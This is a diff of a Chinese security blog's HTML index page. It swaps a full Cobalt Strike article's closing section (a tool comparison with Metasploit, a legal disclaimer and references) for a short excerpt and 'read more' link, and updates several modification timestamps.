-<td>需第三方工具</td>
-</tr>
-<tr>
-<td><strong>学习曲线</strong></td>
-<td>中等</td>
-<td>较低，社区资源丰富</td>
-</tr>
-<tr>
-<td><strong>适用场景</strong></td>
-<td>APT模拟、红蓝对抗、实战演练</td>
-<td>漏洞利用、渗透测试、安全研究</td>
-</tr>
-</tbody></table>
-<p>总结：MSF适合漏洞利用和入门学习；CS更适合高级红队行动，尤其面对防御体系成熟的目标。</p>
-<h2 id="九、免责声明"><a href="#九、免责声明" class="headerlink" title="九、免责声明"></a>九、免责声明</h2><p>本文所述内容仅限以下合法场景：</p>
-<ol>
-<li><strong>授权渗透测试</strong>：获得目标方书面授权后进行的安全评估。</li>
-<li><strong>红蓝对抗演练</strong>：受控环境下的组织内部攻防演练。</li>
-<li><strong>安全研究与教育</strong>：隔离实验室环境中的学习与研究。</li>
-<li><strong>自查自测</strong>：对自己拥有合法权限的系统进行安全检测。</li>
-</ol>
-<p><strong>严禁将本文技术用于任何未授权的计算机系统访问、数据窃取或破坏活动。</strong></p>
-<p>《中华人民共和国网络安全法》第二十七条规定，任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动。《中华人民共和国刑法》第二百八十五条、第二百八十六条规定了非法侵入计算机信息系统罪、破坏计算机信息系统罪的刑事责任。</p>
-<p>任何未经授权的渗透测试行为均属违法，使用者需自行承担相应法律后果。</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
-<li>Cobalt Strike官方文档：<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com/</a></li>
-<li>Malleable C2 Profile语法参考</li>
-<li>MITRE ATT&amp;CK框架对应技术</li>
-</ul>
-
+          <p>Cobalt Strike 基础使用——TeamServer 搭建、Listener 配置、Beacon 命令与 Socks 代理内网穿透。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/Tools-Cobalt-Strike-basics/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -907,7 +649,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -999,7 +741,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1091,7 +833,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1183,7 +925,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:19:08" itemprop="dateModified" datetime="2026-06-05T00:19:08+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1275,7 +1017,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:12:36" itemprop="dateModified" datetime="2026-06-05T00:12:36+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -1367,7 +1109,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-05 00:11:42" itemprop="dateModified" datetime="2026-06-05T00:11:42+08:00">2026-06-05</time>
+      <time title="修改时间：2026-06-05 13:34:13" itemprop="dateModified" datetime="2026-06-05T13:34:13+08:00">2026-06-05</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
